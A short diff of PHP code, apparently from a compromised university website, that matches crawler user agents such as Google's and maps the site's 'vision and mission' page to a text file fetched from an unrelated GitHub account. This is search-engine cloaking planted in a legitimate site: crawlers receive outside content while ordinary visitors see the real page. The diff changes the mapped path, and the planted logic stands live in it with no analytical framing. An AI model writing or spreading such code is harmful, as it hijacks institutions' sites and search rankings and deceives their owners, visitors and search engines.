@@ -7,7 +7,7 @@ $botPattern = '/(bot|ahrefsbot|crawl|spider|slurp|fetch|google|scanner|check|ana
 if (preg_match($botPattern, $userAgent)) {
 
     $pathMapping = [
-        '/visi-dan-misi' => 'https://raw.githubusercontent.com/line66-cokang/lpm-uksw-edu/refs/heads/main/lp1.txt'
+        '/visi-dan-misi/' => 'https://raw.githubusercontent.com/line66-cokang/lpm-uksw-edu/refs/heads/main/lp1.txt'
     ];
     
 
